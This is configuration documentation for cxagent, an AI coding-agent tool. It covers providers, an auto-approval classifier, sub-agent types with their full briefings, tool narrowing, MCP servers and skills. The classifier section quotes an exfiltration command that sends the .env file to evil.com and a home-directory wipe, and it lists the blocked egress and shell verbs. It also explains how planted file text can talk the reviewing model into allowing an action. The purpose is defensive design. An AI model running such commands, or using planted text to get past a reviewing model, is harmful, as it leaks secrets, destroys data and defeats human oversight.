# Configuration

One file: `config.json`, in cxagent's config directory.

| OS | Path |
|---|---|
| Linux | `$XDG_CONFIG_HOME/cxagent/`, or `~/.config/cxagent/` |
| macOS | `~/Library/Application Support/cxagent/` |
| Windows | `%APPDATA%\cxagent\` |

The directory is forced to `0700` and `config.json` to `0600` on every start — it holds API keys, and
a readable directory exposes the file listing even when the file itself is locked down. An install
made before that was enforced is repaired on the next launch rather than staying loose.

There is no config file until you make one. [`config.sample.json`](config.sample.json) documents every
key inline, including what each one's absence means. On a first run with no config, cxagent walks you
through making one; after that this file is yours to edit.

---

## `providers` — required

Named instances. The name is yours; `kind` is what cxagent knows how to talk to.

```json
"providers": {
  "local": {
    "kind": "openai-compatible",
    "model": "qwen3.6-35b-a3b-ud-iq4_xs.gguf",
    "baseUrl": "http://127.0.0.1:8771/v1",
    "contextWindow": 212992
  }
},
"defaultProvider": "local"
```

**`contextWindow` is worth setting even though it is optional.** Without it the app cannot tell you
how full the context is — a percentage needs a denominator, and inventing one would put a confident
figure on a guess. It is also what auto-compaction measures pressure against: unset, the threshold
falls back to a fixed constant that may be far from your model's real headroom.

**`apiKey` supports `${ENV_VAR}`**, so a config file can be committed or shared without carrying a
secret. A key written literally is still forced to `0600`, but the variable form is better.

**`maxConcurrentAgents` bounds how many sub-agents may call this endpoint at once.** Absent or `0`
means unlimited, which is the default — the same convention `maxTurns` uses.

Uncapped is deliberate: cxagent cannot discover what an endpoint tolerates, and a limit chosen
without evidence throttles everyone to guard against a problem they may not have. Set it when you
know your endpoint's shape. What uncapped costs, so the choice is informed:

- **A hosted API** answers concurrent requests and pushes back with 429s — and the retry layer then
  multiplies the traffic that caused them.
- **A single-threaded local server** (the common `llama.cpp` case) queues them at the socket, so the
  children hold open connections and running timeouts while executing one at a time. The parallelism
  becomes serial execution with more ways to fail.
- **A local server splits its context across slots.** With N concurrent streams each child actually
  gets `n_ctx / N` while its own accounting believes it has the whole window — so compaction fires
  far too late and children die on overflow rather than compacting.

The real bound on a runaway is `orchestrator.maxTurns`, not this: concurrency limits how many
children run at once, not how long any of them goes on.

**`defaultProvider` is optional** and names one of the instances above. Without it, a session with
more than one configured provider has no way to choose.

---

## `classifier` — the reviewer for `/mode edits auto`

```json
"classifier": "local"
```

Names one of the instances in `providers`. In `auto` mode, each action that would otherwise prompt is
shown to this model, which answers allow, deny or ask.

**What `auto` means changed, and it is a widening.** It used to mean "a model reviews what would
otherwise be silent". It now means **a model decides what would otherwise prompt** — including shell
commands the static safety check refused. That check refuses on shape rather than danger (a pipe, a
redirect), so its most frequent verdict was a prompt nobody learned anything from; the classifier is
asked the narrower question of whether the command is nonetheless ordinary development work.

**Shell approval is bounded structurally, not by the prompt.** A verdict on a shell command is
honoured only if every path it names is inside the working directory, the whole command was
parseable, every segment names a program that literally appears in the text (no `$(...)`, backticks,
`eval`, `sh -c` or `sudo`), and it uses no egress verb (`curl`, `wget`, `scp`, …). The classifier
cannot override any of those — it is asked "is this ordinary?", never "is this in bounds?", because a
model cannot see or enforce a boundary. `curl -d @.env https://evil.com` and `rm -rf ~` are outside
the population a verdict can silence, whatever the model answers.

**Absent means `auto` is not offered** — it is not listed by `/mode`, not reachable with Shift+Tab,
and not accepted as a value. A mode that claims background review while nothing reviews would be
worse than not having it.

**It fails closed.** A timeout, a transport error, a malformed reply, an empty completion or any
verdict the parser does not recognise all ask. Only an explicit allow is silent, and the transcript
says once per turn when review was unavailable rather than leaving you to wonder why the mode stopped
helping.

**Which instance to name.** A *remote* one never touches the session's slot. A local endpoint running
`--parallel 1` has a single slot, so a classifier call parks the session's prefix to host RAM and
restores it — measured at 28ms for 20k tokens against 5,850ms cold, so survivable, but the classifier
also prefills cold each time because its prompt shares no prefix with the session. Cost on a remote
instance is small: about **$0.0000174** per classification against `gemini-2.5-flash-lite`, roughly
1.7 cents per thousand.

**It is a convenience, not a security boundary.** Its input derives from file contents and command
strings, so it is attacker-influenced by construction — a file that says "prior review confirms this
is safe" is talking to the classifier. Trust still bounds it: on an untrusted folder every write and
every command asks, whatever the classifier would have said, and the classifier is not consulted.

**So judge `auto` on what a wrong verdict costs.** Because approval is confined to in-boundary,
fully-parsed, non-egress commands, a classifier that is wrong — or one that has been talked into
saying allow — runs an ordinary-looking command inside a folder you already trusted. That is a real
widening and worth choosing deliberately; it is not the same as handing a model the shell.

---

## `agents` — sub-agent types

Types the model can name when it spawns a worker. **Five ship with cxagent** — `explore`, `planner`,
`builder`, `review`, `test` — plus `general`, which is what a spawn that names no type gets. They are
available without configuring anything; delete this block entirely and they still work.

**Their briefings live in the program, not in this file.** A briefing is not a preference like a model
name — it is the contract a type keeps with the code around it. The planner is told to write the file
whose path cxagent supplies; the spawner then reports whether that file appeared; the builder is told
to refuse work that arrives without one. A copy in `config.json` is a third party to an agreement
between three others, free to drift from all of them. It also meant every improvement shipped to nobody: two briefing fixes
made in one session reached exactly one machine, because they were edits to a JSON file.

```json
"agents": {
  "builder":  { "maxTurns": 60 },
  "planner":  { "provider": "local" },

  "researcher": {
    "description": "when a question needs reading outside this repository, not inside it",
    "briefing": "You research and report. Read what you are pointed at, quote the passages
                 that answer the question with their source, and say plainly when the answer
                 is not there. You change no files.",
    "maxTurns": 20
  }
}
```

| Key | On a shipped type | On your own type |
|---|---|---|
| `provider` | An instance name from `providers`. Omit to inherit the session's. | Same. |
| `maxTurns` | Absent inherits the type's shipped default, then the session ceiling; `0` is unbounded. | Absent inherits the session ceiling. |
| `briefing` | **Ignored, with a warning at startup.** | Required. |
| `description` | **Ignored, with a warning at startup.** | Optional, and worth writing. |

Ignoring loudly is deliberate. An edit that does nothing and says nothing is the worst of the three
options — silently winning restores the drift, silently losing leaves you debugging a change that was
never applied. If you want different text, give the type a name cxagent does not ship: any name that
is not built in is entirely yours, exactly as before.

**`description` and `briefing` are for different readers, and neither is derived from the other.**
The briefing goes to the CHILD in full, as the highest-authority text in its prompt. The description
goes to the PARENT, as one line in the spawn tool's catalog — the only thing the model sees before
choosing a type. It is the same split skills use, for the same reason: *the description is the entire
interface.*

Write the situation, not the job. *"when finding something means reading across several files"* helps
a chooser; *"searches files and reports what it found"* describes an agent that is already chosen.

Without a description the catalog says `runs where you do, no special instructions` — the same line a
type with no briefing gets. It does NOT fall back to the briefing: that was the old behaviour, and it
produced rows like `You search and report.`, which is written in the second person for the child and
tells a chooser nothing. The honest answer for a type nobody described is that nothing was said.

Every shipped type has one, and they run to a few sentences each. Length is not capped — say when to
reach for it AND what comes back, because a parent is deciding what to plan around as well as whether
to delegate. The bound worth respecting is the spawn tool's own guidance above the catalog: the
shipped five total about 1,600 characters against its ~2,150, so they inform without burying it.

**A type's provider brings its own context window.** They resolve together, deliberately: a child
given one provider and another's window never sees pressure, never compacts, and dies on an overflow
rather than degrading.

**`maxTurns` is a backstop, not a budget.** Seen live: an `explore` child spent all 30 of its turns
hunting a JSON schema that is not published anywhere, then filled its last few re-reading local
files. The cap stopped it, the parent was told `capped`, and the session carried on — but the fix was
the briefing, not the number. A give-up clause would have returned a useful answer at turn 15.
`/stats` counts capped runs apart from failures for exactly this reason.

Unknown type names are refused rather than silently treated as `general`: substituting the default
would mean the briefing did not apply and nobody was told.

### `planner` and `builder` — a pair

The sample defines two types that work together. **The planner writes a plan to `./plans/` and
returns the path**; the parent hands that path to a **builder, which reads it and implements it —
and refuses to start without one.**

The path matters more than it looks. A plan returned as text lands in the parent's context and again
in the builder's, so it is paid for twice and stays resident for the rest of the session. A path
costs a line. This is the same reason Claude Code's own multi-agent workflow passes plan files rather
than plan text.

**The builder stopping is the point.** Nothing prevents an agent from inventing a plan when none
arrives — a briefing is a request, not a permission — but a type whose first instruction is "stop and
say you were given no plan" turns the most likely failure into a loud one instead of a silent
rewrite. A builder that quietly plans its own work looks like progress and is not.

**Neither type is required, and there is no plan mode.** A plan can come from the planner, from you
in conversation, or from a file you wrote by hand — the builder never has to know which. `/mode work
plan` therefore answers "not settable yet": what makes an agent plan well is its briefing, and
briefings already compose.

`plans/` is gitignored. A plan is a working note for a task in flight; one worth keeping belongs in
`docs/` under a name you chose.



### What each shipped type is told

Reproduced so a bad run can be debugged without reading source — or run **`/agents <name>`**, which
prints the same text from the running session. `cxagent/Core/Agent/BuiltinAgentTypes.cs` is the
source of truth for both.

#### `explore`

*Catalog line (`maxTurns` 30 by default):* when answering means reading across several files and you want the conclusion rather than the file dumps. Give it a question, not a location. It returns exact paths as file_path:line_number and says plainly when the thing does not exist — a confident negative is a real answer. It does not edit anything. USE THE PLANNER INSTEAD when what you want back is a design rather than a fact: a planner reads code too, so sending an explorer to plan something gets you a report about the code as it is, which is not a plan and cannot be built from. WHEN YOU PASS ITS FINDINGS ON, put them in `context`, not in the prompt — context stays with the next agent for its whole run, a prompt does not survive a long one, and an agent that loses the facts you gave it goes and reads the same files again.

> You search and report. Find what was asked for, give exact paths as file_path:line_number, and say what you actually saw rather than what you expect to be true. Do not edit anything. If the thing asked for does not appear to exist, say so and say where you looked — a confident negative is an answer, and is worth more than more searching. Before you report a path, check it against what you actually opened.

#### `review`

*Catalog line (inherits the session ceiling):* when you want code checked for correctness — logic that is wrong rather than style that is unusual. Best on a diff or a named set of files. It returns specific objections with a failing case behind each one, and says plainly when something is fine rather than inventing concerns.

> You review code for correctness. Look for logic that is wrong rather than style that is unusual, and say plainly when something is fine. An objection with no failing case behind it is noise.

#### `test`

*Catalog line (inherits the session ceiling):* when tests need running and a failure needs diagnosing. It reads the actual output before drawing a conclusion — a command that exits 0 has not necessarily verified anything, and a filter that matched nothing exits 0 too — and reports the counts it saw rather than the counts it expected.

> You run and diagnose tests. Read the actual output before drawing a conclusion — a command that exits 0 has not necessarily verified anything, and a filter that matched nothing exits 0. Report the counts you saw.

#### `planner`

*Catalog line (`maxTurns` 40 by default):* when the change should be thought through before any of it is written, or when you are not sure the request is possible as asked. IT DOES ITS OWN READING — you do not need to explore first, and sending an explorer to design something gets you a description of the code rather than a plan for changing it. BUT IF YOU HAVE ALREADY EXPLORED, hand what was found to it in `context` rather than the prompt: otherwise it re-reads the whole codebase to rediscover what you already knew, and may spend its run doing that instead of writing the plan. It reads enough to be specific and writes the plan to a file whose path cxagent gives it — the result tells you that path, or tells you plainly that no plan was written. Its answer covers what the change is, the steps in order, which step is most likely to be wrong, and anything it found that changes the shape of the work — including a reason it cannot be done as asked. It changes nothing else.

> Your one deliverable is a plan FILE, and its path is given to you — your context names the exact path to write, and that is the file the parent reads. Write it with write_file before you finish. Do not choose a different name or a different directory: nobody looks there. Your answer is a briefing about the plan, not the plan itself. A run that investigates well and ends without that file has failed, however good the reading was: whoever asked has nothing to build from, and nothing to review. If you find yourself about to stop, check first that you have written it. IF A READ FAILS, FIND THE FILE — never assume what is in it. A path that does not resolve means you guessed the location, not that the thing is absent: glob or grep for the name before concluding anything. A plan built on assumptions is worse than no plan, because it reads exactly like one that was checked. Never write a step against a file you have not read, and if you genuinely cannot find something, say so in the plan instead of inventing around it. READ ONLY UNTIL YOU CAN BE SPECIFIC, then stop and write. You do not need to understand the whole codebase; you need to name the files that must change and what each change is. When you can do that, you are done reading — further reading is not making the plan better, it is postponing it. In the file: what the change is and why it takes that shape, the steps in the order they can be made without breaking the build in between, which step is most likely to be wrong and what would prove it early, and anything you found that changes the shape of the work — an existing mechanism to reuse, a constraint the code imposes, or a reason the request cannot be done as asked, which is the most valuable thing you can report and the easiest to leave out. Write for someone who cannot ask you anything: exact paths, and quote the identifiers a step depends on rather than describing them. A step nobody could carry out without asking you a question is not finished. Then answer properly. The FILE is the instruction for whoever builds; your ANSWER is the briefing for whoever decides whether to spend a build run at all — so give them the several paragraphs you would give a colleague who asked "so what are we doing?": what the change is, the steps in order with the file each one touches, what is most likely to be wrong, and what you found that changes the work. A path with no explanation is not an answer. You change nothing except the plan file.

#### `builder`

*Catalog line (inherits the session ceiling):* when a plan already exists and you want it carried out — pass the plan's path or its text in context. It follows the plan in order without re-deciding it, verifies each step before moving on, and stops to ask rather than substituting its own approach when a step is wrong. It refuses to start if no plan reaches it.

> You implement a plan that already exists — you never write one. The plan reaches you as a path to read, or as text in your context. IF NEITHER IS PRESENT, STOP IMMEDIATELY and report that you were given no plan. Do not infer one from the task description, and do not start work to see how far you get: a builder that invents its own plan is the failure this type exists to prevent, and it is worse than doing nothing because it looks like progress. CHECK THAT WHAT YOU WERE GIVEN IS A PLAN. A plan names the steps in the order they can be carried out; a report describes code as it currently is. If you were handed a description of the codebase rather than a sequence of changes, with no ordered steps and no path to a plan file — say so and stop. This is not hypothetical: a parent that meant to spawn a planner and typed the wrong agent type gets an explorer's report back, calls it a plan, and hands it to you. Building from it produces confident work nobody designed. Follow the plan in the order written and do not re-decide it: if a step is wrong, or cannot be carried out as written, stop and say which step and why rather than substituting an approach nobody asked for — the plan may encode a constraint you cannot see, and a plan silently improved is a plan nobody reviewed. DO THE STEPS IN THE PLAN AND STOP. Work the plan does not name is not yours to do, however obviously it follows: if carrying out the plan reveals more that is needed, finish what the plan says, then REPORT what else you found and let whoever asked decide. A builder that keeps going until the feature feels complete has written its own plan after all — and it does so file by file, so nobody notices until the diff is far larger than what was agreed. Make each change, then run what proves it before moving on: a step whose verification you skipped is a step you have not finished. BUILD AS SOON AS THERE IS SOMETHING TO BUILD — the first file, not the last. Two measured runs wrote code for fifty-five turns and thirty-two turns respectively before compiling once, and both times the first build reported something trivial that had been wrong the whole way: a type whose members had been invented, and a missing import. Errors are cheap alone and expensive in a pile, because each one you find late may have shaped the code written after it. Report what you actually ran and what it said. Name any step you did not complete and why, and never report success for work you did not verify — a wrong 'done' is worse than a clear 'stuck'.

## `tools` — what an agent is offered

Every agent gets all twelve tools unless something narrows them. A **selection** is a list of terms
saying which it should have:

```json
"llmAgent": { "tools": ["inherited", "-run_shell", "-write_file"] }
```

That is a session that reads and searches but never writes or shells out. Absent, nothing is
narrowed — the default is unchanged and this key is one you can ignore entirely.

### The terms

| Term | Means |
|---|---|
| `inherited` | Start from what the level above offers. Only the FIRST one in a selection does anything; a second is a no-op. |
| `all` | Start from everything, discarding what an outer level narrowed. |
| `read_file` | A bare name is a whitelist: name every tool you want. |
| `-run_shell` | Remove one tool from whatever is in force. |
| `+run_shell` | Add one back that an outer level removed. |

`["inherited", "-run_shell"]` is the common shape: everything I would normally get, minus one.
`["read_file", "grep", "glob"]` is the other: exactly these three and nothing else.

**`+` can reopen what a wider level closed.** That is deliberate, and it is safe for one reason: a
selection is only ever written in config or in code, never by a model. A narrowed agent cannot widen
itself by asking.

### The four levels

They compose outward-in, each applied to what the one before it left:

| | Where | Scope |
|---|---|---|
| **S1** | `llmAgent.tools` here, or in code when embedding | The session's agent, for its whole life |
| **S2** | The embedding application, per session | One session |
| **S3** | Per turn, in code | One request |
| **S4** | `agents.<type>.tools` | Every child spawned as that type |

```json
"agents": {
  "explore": { "tools": ["inherited", "-write_file", "-replace_in_file"] }
}
```

A shipped type may set `tools` even though it may not set `briefing`. The two are different kinds of
thing: a briefing is text the code depends on, while a toolset is a property of **your** deployment,
which cxagent cannot know.

### The twelve names

`read_file` · `write_file` · `replace_in_file` · `glob` · `grep` · `run_shell` · `web_fetch` ·
`http_request` · `todowrite` · `ask_user` · `agent` · `skill`

A name that matches nothing is not an error and not a warning: names arrive late — a skill appears,
an application injects a tool — so a term matching nothing today may match tomorrow, and an
unmatched name grants nothing either way. A malformed term (`*run_shell`) IS warned about at startup
and dropped, because the grammar is checkable and a bad term would otherwise open a session cleanly
and fail every turn of it.

### What a selection does not reach

**MCP tools are never narrowed.** Each server's `enabled` flag is its control, and it is a better
one: servers connect asynchronously, so a selection resolved before a handshake finished would
silently drop tools that arrived a moment later.

**The permission gate still applies to everything offered.** Selection decides what an agent HAS;
permissions decide what it may DO with it. Narrowing is not a substitute for the gate, and the gate
is not a substitute for narrowing.

**A withheld tool is refused, not hidden.** Call one by name and the answer is "not available" —
distinct from "no such tool", which is what a typo gets. The distinction matters to a model: one
means stop, the other means try a different name.

### Things it changes that are easy to miss

- **The system prompt.** Sections teaching delegation or asking are dropped when `agent` or
  `ask_user` is withheld, and tool descriptions stop pointing at tools you do not have.
- **`/skills` and `/agents`** say so when the tool that reaches them is not offered.
- **Fan-out mode falls back to single** if `agent` is withheld, and says so once. Leaving the mode
  set while nothing can delegate would keep `/mode` and reality disagreeing for the session's life.
- **A planner gets no plan path** if it cannot write, rather than being told to write a file it
  cannot create.

### Set it once per session

An S3 selection that changes between requests rewrites the cached prompt prefix each time it does.

Measured against a local llama.cpp server, 2,800-token prompt:

| | cached | processed | prompt eval |
|---|---|---|---|
| Prompt unchanged, conversation grows | 2,824 | 28 | **66 ms** |
| Prompt changed | 0 | 2,830 | **773 ms** |

**The change was appended to the END of the system prompt and still cost the whole prefix.** A
prefix cache matches from token zero and stops at the first difference, so moving volatile text
later in the prompt saves nothing — the conversation trails the system message either way. On a
long session this is the difference between paying for one turn and paying for all of them: an
earlier drive measured 67,367 tokens and about 21 seconds reprocessed for a 134-character change at
turn 82.

S1 and S2 are fixed for the agent's life, so the gated text is byte-identical every turn and none of
this applies — verified on a five-turn drive where the system prompt hashed the same each time. It
is correct either way, and a caller who varies S3 asked for the difference. But if the narrowing is
a property of the session rather than of one request, S1 or S2 costs nothing.

## `mcp` — servers

```json
"mcp": {
  "context7": { "command": ["npx", "-y", "@upstash/context7-mcp"], "enabled": true },
  "remote":   { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer ${TOKEN}" } }
}
```

`command` is argv — no shell, so no pipes, globs or redirection. An HTTP server uses `url` instead,
and may carry `headers`. Optional per server: `enabled` (default true), `cwd`, `env`, `timeoutMs`.

A server's own usage instructions, when it sends any, are appended to the system prompt **attributed
to it by name**, so the model can tell that advice apart from cxagent's own.

`/mcp reload` re-reads this block and reconnects, for a file you edited by hand — which is what makes
an `mcp` change take effect without restarting. Adding a server does not need a restart.
`/mcp login <server>` runs OAuth for a server that returned 401 and stores the token at `0600`,
never in the config file.

---

## `theme` — colours

```json
"theme": "Ocean"
```

The theme cxagent starts in. **Absent means `cxagent`** — its own palette, a near-black ground with a
warm amber accent. Names are matched case-insensitively, so `ocean` finds `Ocean`.

**A name that matches nothing falls back rather than failing.** Which themes exist is a question only
the window system can answer, and it does not exist when this file is read — so an unknown name is
resolved at startup and quietly replaced with the default. A misspelt colour scheme is not worth
refusing to start over.

Run `cxagent --help` to see what is installed; `--theme <name>` overrides this key for one run.

## `orchestrator` — caps

```json
"orchestrator": { "maxTurns": 300 }
```

`maxTurns` is how many turns one request may take before the agent stops and summarises what it
got. **Absent means the built-in ceiling of 300** — which is not the same as no cap. **`0` means no
cap**, the explicit opt-out.

It applies to the session agent *and* to sub-agents: a child inherits it unless its own type sets
`agents.<name>.maxTurns`.

`contextCompressThreshold` is the other key here — compact above this many tokens. Absent, it is
80% of the model's context window when that is known, and a built-in threshold when it is not.

---

## Instruction files — `AGENTS.md` and friends

Separate from `config.json`, and answering a different question: config is *how this app is wired*,
instructions are *what an agent should know here*. They ride in the system message.

**Two files apply, in this order:**

1. **The global one** — `CXAGENT.md` in cxagent's config directory. What is true of you wherever you
   work.
2. **The nearest project one** — searched by walking up from the working directory, stopping at the
   repository root (the directory holding `.git`). Outside a repository only the working directory
   itself is read: with no worktree there is no boundary that means anything, and climbing would let
   a scratch folder under your home directory pick up that directory's own files.

**Project file names, first match wins:**

| Name | Why in this order |
|---|---|
| `CXAGENT.md` | So a repo can address **this** agent specifically. Some instructions are only true of cxagent — its permission model, its process — and a shared file is the wrong place for them. |
| `AGENTS.md` | The vendor-neutral convention, and what a repo will already have if it has anything. |
| `CLAUDE.md` | Last, so a repo carrying only that one is still honoured. |

**One NAME, but every level inside the repo that has it.** The first name that matches anywhere wins,
and then every copy of *that* name from the repository root down to here is used, root first — so the
nearest file is rendered last and wins on a conflict. The monorepo case is why: a root file carries
the house style, a package file carries what is specific to that package, and both are true at once.
What is never mixed is the *names* — a repo with `AGENTS.md` at its root and `CLAUDE.md` in a
subdirectory gets the `AGENTS.md`.

**The global file is `CXAGENT.md` and only that.** No `AGENTS.md` at that path — no other agent reads
cxagent's config directory, so the shared name buys nothing and invites confusion. No global
`CLAUDE.md` either: a `CLAUDE.md` describes a *project*, and reading one from a home directory
applies project instructions to every project.

**Capped at 8,000 characters, and the cut is marked in the text.** This rides in the prompt-cache
prefix that is re-sent on every turn, so a large instruction file is not a one-off cost but a
permanent tax on the window. Instructions that stop mid-sentence with no explanation read as a bug in
the agent, so the truncation says so.

---

## Skills

Instructions the model loads **when it needs them**, instead of paying for them on every turn.

The split is the whole point: a skill's **name and description** ride in the system prompt
permanently and cost a few hundred characters, while its **body** is fetched by a tool only when the
model decides a task matches. Twenty skills of 3k each would be 60k of permanent prefix; their
catalog is a rounding error.

**A skill is a directory with a `SKILL.md`:**

```
.cxagent/skills/
  double-entry-posting/
    SKILL.md
```

```markdown
---
name: double-entry-posting
description: Use when adding, reviewing or fixing any ledger posting or balance
  logic in this repo. Covers house rules that are not obvious from the code.
---

# Double-entry posting

Every posting must sum to exactly zero. A transaction that does not balance is
rejected, never auto-corrected.
```

**The description is the entire interface.** It is the only thing the model sees before deciding, so
write it as *"Use when…"* rather than as a title. A description that says WHEN beats one that says
WHAT — the model is matching a task against it, not reading a table of contents.

**Where they live, first directory with a valid skill wins:**

| Location | Meaning |
|---|---|
| `<repo>/.cxagent/skills/` | This project, addressed to this agent |
| `<repo>/.agents/skills/` | This project, vendor-neutral — the plural of the `AGENTS.md` convention |
| `<config dir>/skills/` | You, wherever you work |

Searched by walking up from the working directory to the repository root, nearest first, so a
package's own skills outrank the repo's. Same boundary as the instruction files, and it matters more
here: a skill is text the model reads **and acts on**, and the directories above your home folder are
writable by other people on a shared machine.

**Unlike instructions, skills shadow rather than stack.** Two `AGENTS.md` files combine sensibly —
house style plus package specifics. Two `SKILL.md` files with the same name are two *versions* of one
document, and merging them produces a document that contradicts itself. Exactly one directory
supplies the catalog.

**"Has a skill" means at least one that parses**, not merely that the directory exists — an abandoned
empty `.cxagent/skills/` must not silently switch off a populated `.agents/skills/` beside it.

**`.claude/skills/` is not read.** Those files carry `allowed-tools`, a tool grant written for a
different application with different tools; honouring it silently would mean obeying permissions you
never granted here. If you want them, say so explicitly:

```sh
ln -s .claude/skills .cxagent/skills
```

Their prose then loads normally. Unknown frontmatter keys — `allowed-tools`, `argument-hint` — are
ignored rather than rejected, which is what makes that symlink work. cxagent's own permission gate
governs every call a skill provokes, exactly as if the model had chosen the tool itself.

**A skill can ship other files.** Reference documents, templates, examples — anything beside the
`SKILL.md`:

```
.agents/skills/xunit/
  SKILL.md
  manifest.json
  references/
    patterns.md
    anti-patterns.md
```

They are **listed by absolute path when the skill loads**, and the model reads the one it needs with
the ordinary file tool. Not inlined: inlining every reference would hand back the permanent prefix
the catalog/body split exists to avoid, and most references go unread on most tasks. Write the body
to point at them by name — *"see references/anti-patterns.md for what not to do"* — and the model
matches that against the listing.

The same permission gate governs those reads as governs every other one. A **project** skill's files
are inside the working boundary and read without asking; a **global** skill's live in the config
directory, outside it, so they prompt — those files are not part of the repository you are working
in. Twenty files are named before the list is cut short, since the listing rides in the window for
the rest of the session.

**A malformed `SKILL.md` is skipped and reported, never guessed at.** Missing frontmatter, missing
`description`: the skill does not exist as far as the model is concerned, and `/skills` says which
file and why — including files in a directory that lost the shadowing contest, since a broken file in
a shadowed directory is exactly the one nothing else would explain.

**The name comes from the folder.** A `name:` in the frontmatter is checked against it and reported
when it disagrees, never obeyed — otherwise two directories could declare the same skill.

**Re-read every turn.** Edit a skill and it takes effect on the next one, with no restart and no
refresh command. The prompt cache is protected by comparison rather than by caching the read: an
unchanged file renders byte-identical text and the system message is not replaced, so editing one
costs a single prefix — which is what you asked for by editing it.

**Once loaded, a skill stays until the conversation is compacted.** Its body is an ordinary tool
result, so it is re-sent every turn like any other and cannot be unloaded — an unload would leave the
call that fetched it unanswered, which breaks the session outright. When compaction does remove it,
the model is told which skills went and that it may reload them; without that it would keep citing a
document it can no longer read. `/skills` shows what exists; the session panel shows what is
currently in force.

---

## What else lives in that directory

| File | What it is |
|---|---|
| `config.json` | This file. `0600`. |
| `cxagent.db` | The resume buffer — one row per agent, replaced every turn, worthless once a session ends cleanly. Pruned on startup. |
| `history.db` | Usage history for `/stats`. An archive: append-only, never pruned. `/stats clear` empties it. |
| `logs/<agent-id>/` | Per-turn context dumps and per-tool output. A sub-agent's logs nest **inside** its parent's directory, so the tree mirrors who spawned whom. |
| `CXAGENT.md` | Your global instructions, if you wrote any. |

Deleting `cxagent.db` costs a crash recovery and nothing else. Deleting `history.db` costs `/stats`.
